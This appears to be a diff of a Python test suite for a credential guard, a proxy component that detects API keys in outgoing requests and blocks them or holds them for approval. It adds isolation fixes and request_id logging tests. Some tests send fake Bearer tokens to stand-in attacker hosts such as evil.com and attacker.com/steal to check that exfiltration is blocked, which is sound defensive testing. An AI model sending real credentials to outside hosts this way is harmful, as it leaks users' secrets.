@@ -1339,17 +1339,26 @@ class TestApprovalWorkflow:
 
     def test_full_approval_workflow_integration(self, credential_guard, make_flow):
         """Test full workflow: detection → pending → approval → allowlist."""
+        import uuid
+
+        # Use unique host to avoid conflicts with persistent policy store
+        unique_host = f"test-api-{uuid.uuid4().hex[:8]}.example.com"
+        unique_credential = f"custom-secret-{uuid.uuid4().hex[:16]}-abc123xyz456"
+
+        # Clear any existing policy store data for isolation
+        credential_guard.policy_store = None
+
         # Make a request with unknown credential to trigger greylist_approval
         flow = make_flow(
             method="POST",
-            url="https://custom-api.example.com/endpoint",
-            headers={"X-API-Key": "custom-high-entropy-secret-key-abc123xyz456"}
+            url=f"https://{unique_host}/endpoint",
+            headers={"X-API-Key": unique_credential}
         )
 
         credential_guard.request(flow)
 
         # Should get 428 response
-        assert flow.response is not None
+        assert flow.response is not None, "Expected 428 response but got None"
         assert flow.response.status_code == 428
 
         body = json.loads(flow.response.content)
@@ -1367,13 +1376,13 @@ class TestApprovalWorkflow:
         # Should be in temp allowlist now
         allowlist = credential_guard.get_temp_allowlist()
         assert len(allowlist) == 1
-        assert allowlist[0]["host"] == "custom-api.example.com"
+        assert allowlist[0]["host"] == unique_host
 
         # Retry the request - should now be allowed
         flow2 = make_flow(
             method="POST",
-            url="https://custom-api.example.com/endpoint",
-            headers={"X-API-Key": "custom-high-entropy-secret-key-abc123xyz456"}
+            url=f"https://{unique_host}/endpoint",
+            headers={"X-API-Key": unique_credential}
         )
 
         credential_guard.request(flow2)
@@ -2354,3 +2363,58 @@ class TestProjectIdIntegration:
                 merged = guard._merge_policies(project_id)
                 hmacs = [r.get("token_hmac") for r in merged["approved"] if r.get("token_hmac")]
                 assert "abc123" in hmacs
+
+
+class TestRequestIdPropagation:
+    """Tests for request_id propagation in credential guard logging."""
+
+    def test_flow_metadata_request_id_available(self, make_flow_with_request_id):
+        """Verify fixture correctly sets request_id in flow metadata."""
+        flow = make_flow_with_request_id(
+            request_id="req-abc123def456",
+            url="https://api.openai.com/v1/chat",
+            headers={"Authorization": "Bearer sk-proj-test123"}
+        )
+
+        assert flow.metadata.get("request_id") == "req-abc123def456"
+        assert "start_time" in flow.metadata
+
+    def test_log_decision_uses_request_id(self, credential_guard, make_flow_with_request_id, tmp_path):
+        """Verify _log_decision includes request_id from flow metadata."""
+        from unittest.mock import patch
+        import json
+
+        log_path = tmp_path / "test.jsonl"
+
+        with patch("addons.utils.AUDIT_LOG_PATH", log_path):
+            flow = make_flow_with_request_id(
+                request_id="req-credtest123",
+                url="https://evil.com/api",
+                headers={"Authorization": "Bearer sk-proj-abc123xyz456def789ghijk"}
+            )
+
+            credential_guard.request(flow)
+
+            # Read the log file and verify request_id is present
+            if log_path.exists():
+                lines = log_path.read_text().strip().split("\n")
+                for line in lines:
+                    entry = json.loads(line)
+                    if entry.get("event") == "security.credential":
+                        assert entry.get("request_id") == "req-credtest123"
+                        break
+
+    def test_metadata_preserved_through_detection(self, credential_guard, make_flow_with_request_id):
+        """Verify request_id is preserved through credential detection flow."""
+        flow = make_flow_with_request_id(
+            request_id="req-preserve123",
+            url="https://attacker.com/steal",
+            headers={"Authorization": "Bearer sk-proj-verylongkey123456789abcdef"}
+        )
+
+        credential_guard.request(flow)
+
+        # Request ID should still be in metadata after processing
+        assert flow.metadata.get("request_id") == "req-preserve123"
+        # And blocked_by should be set
+        assert flow.metadata.get("blocked_by") == "credential-guard"
